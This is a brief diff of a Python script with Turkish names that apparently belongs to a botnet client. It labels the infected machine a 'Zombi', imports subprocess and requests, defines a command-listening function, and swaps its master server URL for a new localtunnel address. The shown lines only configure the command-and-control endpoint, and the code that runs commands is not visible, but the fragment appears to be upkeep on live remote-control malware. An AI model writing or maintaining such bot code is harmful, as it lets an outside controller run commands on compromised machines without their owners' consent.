@@ -5,7 +5,7 @@ import requests
 import subprocess
 
 # --- AYARLAR ---
-MASTER_URL = "https://shy-otters-trade.loca.lt" 
+MASTER_URL = "https://social-words-allow.loca.lt" 
 ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
 def komut_dinle():
